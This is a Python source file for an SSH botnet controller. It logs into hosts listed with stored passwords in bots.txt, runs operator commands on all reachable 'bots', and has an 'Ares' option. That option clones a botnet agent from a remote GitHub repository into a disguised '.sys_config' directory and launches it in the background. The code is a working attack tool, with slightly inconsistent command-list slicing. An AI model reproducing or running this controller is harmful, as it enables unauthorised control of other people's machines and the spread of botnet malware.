import paramiko
from tabulate import tabulate

class Bot():

	def __init__(self, id, host, user, passw):
		self.id = id
		self.host = host
		self.user = user
		self.passw = passw
		self.status_up = False
		self.error = None

	def updateStatus(self):
		try:
			ssh.connect(hostname=self.host, username=self.user, password=self.passw)
			stdin,stdout,stderr = ssh.exec_command("uptime -p")
			ret = stdout.channel.recv(4096).decode(encoding='UTF-8')
			#print(self.user + "@" + self.host, " ", ret)
			self.status_up = True
		except Exception as e:
			self.status_up = False
			self.error = e
			#print("Error trying to connect to " + self.user + "@" + self.host)
			#print(e)
		return self.status_up


def get_bots(path):
	bots = []
	i = 0
	for line in open(path, 'r').readlines():
		h, passw = line.split()
		user, host = h.split('@')
		bots.append(Bot(i, host, user, passw))
		i += 1
	return bots

def getStatus(bots):
	headers = ["Bot ID", "Host", "User", "Status", "Error"]
	bots_table = []
	for bot in bots:
		up = bot.updateStatus()
		if up:
			bots_table.append([bot.id, bot.host, bot.user, "\033[92mUP\033[0m"])
		else:
			bots_table.append([bot.id, bot.host, bot.user, "\033[91mDOWN\033[0m", bot.error])
	print(tabulate(bots_table, headers))

def executeCmd(bots, cmd):
	for bot in bots:
		if bot.status_up:
			print("Bot [" + str(bot.id) + "]: ")
			try:
				ssh.connect(hostname=bot.host, username=bot.user, password=bot.passw)
				stdin,stdout,stderr = ssh.exec_command(cmd)
				ret = stdout.channel.recv(4096).decode(encoding='UTF-8')
				print(ret)
			except Exception as e:
			 	print(bot.id, ": failed to connect")

def infectAres():
	cmds = ["git clone https://github.com/andrealmeid/Ares.git .sys_config",
    "python2 .sys_config/Ares/agent/pythonagent.py &"]

	for bot in bots:
		if bot.status_up:
			print("Bot [" + str(bot.id) + "]: ")
			try:
				ssh.connect(hostname=bot.host, username=bot.user, password=bot.passw)
			except Exception as e:
				print(bot.id, ": failed to connect")
				continue

			print("Downloading agent...")
			for cmd in cmds[:4]:
				stdin,stdout,stderr = ssh.exec_command(cmd)
				print(stderr.read().decode(encoding='UTF-8'))
				ret = stdout.channel.recv(4096).decode(encoding='UTF-8')
				print(ret)

			print("Starting agent..")
			for cmd in cmds[4:]:
				ssh.exec_command(cmd)

			print("Agent started!")



def printHelp():
	print("\nCommands:")
	commands_table = [["cmd", "execute command to all UP bots"],
	["rescan", "rescan for hosts status"],
	["Ares", "infect hosts with Ares botnet agent"],
	["help", "print this"],
	["exit", "exit program"]]
	print(tabulate(commands_table, tablefmt="jira") + "\n")

if __name__ == "__main__":
	print('\n                  888             888               888    ')
	print('                  888             888               888    ')
	print('                  888             888               888    ')
	print('\033[95m.d8888b  .d8888b  88888b.         88888b.   .d88b.  888888 \033[0m')
	print('88K      88K      888 "88b        888 "88b d88""88b 888')
	print('\033[91m"Y8888b. "Y8888b. 888  888 888888 888  888 888  888 888 \033[0m   ')
	print('     X88      X88 888  888        888 d88P Y88..88P Y88b.  ')
	print(' 88888P´  88888P´ 888  888        88888P"   "Y88P"   "Y888 \n\n\n')

	bots = get_bots("bots.txt")

	ssh = paramiko.SSHClient()

	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	getStatus(bots)

	printHelp()

	while True:
		cmd = input("> ")

		if cmd == "exit":
			exit(0)

		elif cmd == "rescan":
			getStatus(bots)

		elif cmd == "Ares":
			infectAres()

		elif cmd == "cmd":
			cmd = input("> Type your command: ")
			executeCmd(bots, cmd)

		elif cmd == "help":
			printHelp()

		else:
			print("Command not found")
